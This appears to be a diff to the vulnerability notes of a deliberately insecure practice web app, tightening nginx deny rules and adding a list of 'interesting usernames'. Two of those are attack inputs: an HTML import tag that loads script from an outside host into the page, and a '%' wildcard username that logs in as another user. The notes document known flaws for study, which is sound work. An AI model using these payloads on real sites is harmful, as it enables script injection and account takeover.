@@ -14,9 +14,9 @@ The nginx configuration permits local file access because `root` is set too high
     root /vagrant;
     location / { try_files $uri @app; }
     location /setup/ { deny all; }
-    location ~ vagrant { deny all; }
+    location ~* vagrant { deny all; }
     location ~ \.db$ { deny all; }
-    location ~ \.pyc?$ { deny all; }
+    location ~ \.py$ { deny all; }
     location ~ (^|/)\. { deny all; }
 
 
@@ -29,3 +29,14 @@ The nginx configuration permits local file access because `root` is set too high
 * REST API without access control
 * server misconfiguration
 * salt reuse/MAC oracle
+
+
+## Some interesting usernames
+
+* `<link rel = "import" href = "https:&sol;&sol;mjec.net&sol;badscript.html`
+
+  This injects `https://mjec.net/badscript.html` as HTML into the page. If that contains javascript, javascript runs. Requires appropriate CORS headers on the remote resource.
+
+* `%`
+
+  This logs you in as the first user with a password matching the password entered.
